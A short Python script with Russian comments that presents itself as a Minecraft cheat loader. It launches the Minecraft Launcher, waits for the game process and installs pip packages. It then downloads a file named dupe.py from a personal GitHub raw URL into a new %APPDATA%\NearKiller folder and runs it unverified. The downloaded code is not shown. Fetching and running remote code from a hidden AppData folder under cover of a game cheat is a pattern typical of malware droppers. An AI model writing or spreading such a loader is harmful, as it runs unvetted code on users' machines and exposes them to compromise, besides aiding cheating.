import os
import subprocess
import sys
import urllib.request
import time
import psutil

# Путь к EXE-файлу Minecraft Launcher (укажи верный путь)
minecraft_path = r"C:\Program Files (x86)\Minecraft Launcher\MinecraftLauncher.exe"

target_folder = os.path.join(os.getenv("APPDATA"), "NearKiller")
os.makedirs(target_folder, exist_ok=True)

script_url = "https://raw.githubusercontent.com/Artesdfqa/1233213123/main/dupe.py"
script_path = os.path.join(target_folder, "dupe.py")

def is_minecraft_running():
    for proc in psutil.process_iter(['name']):
        try:
            if 'java' in proc.info['name'].lower() or 'minecraft' in proc.info['name'].lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return False

# Шаг 1: Запускаем Minecraft
print(f"[*] Запуск Minecraft из:\n{minecraft_path}")
try:
    subprocess.Popen(minecraft_path)
except Exception as e:
    print(f"[!] Не удалось запустить Minecraft: {e}")
    sys.exit(1)

# Шаг 2: Ждём, пока Minecraft не запустится
print("[*] Ожидание запуска Minecraft...")
while not is_minecraft_running():
    print("[*] Minecraft не запущен. Повторная проверка через 5 секунд...")
    time.sleep(5)

print("[+] Minecraft запущен. Продолжаем...")

# Шаг 3: Установка зависимостей
subprocess.call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
subprocess.call([sys.executable, "-m", "pip", "install", "customtkinter", "requests"])

# Шаг 4: Скачивание чита
print(f"[*] Скачивание чита из: {script_url}")
try:
    urllib.request.urlretrieve(script_url, script_path)
    print("[+] Файл успешно скачан.")
except Exception as e:
    print(f"[!] Ошибка при скачивании: {e}")
    sys.exit(1)

# Шаг 5: Запуск чита
print("[*] Запуск чита...")
subprocess.Popen([sys.executable, script_path])
print("[✓] Готово.")
